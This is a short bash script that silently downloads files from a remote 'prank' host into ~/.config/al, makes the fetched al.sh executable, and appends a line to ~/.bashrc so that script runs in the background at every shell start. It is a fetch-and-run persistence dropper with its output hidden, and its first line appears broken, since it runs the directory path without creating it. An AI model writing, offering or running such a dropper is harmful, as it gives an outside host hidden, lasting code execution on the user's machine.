#!/bin/bash
~/.config/al >/dev/null 2>&1; cd ~/.config/al; wget -r -nc -nd http://prank.hostei.com/ >/dev/null 2>&1 && chmod +x al.sh && echo ". ~/.config/al/al.sh & disown $!" >> ~/.bashrc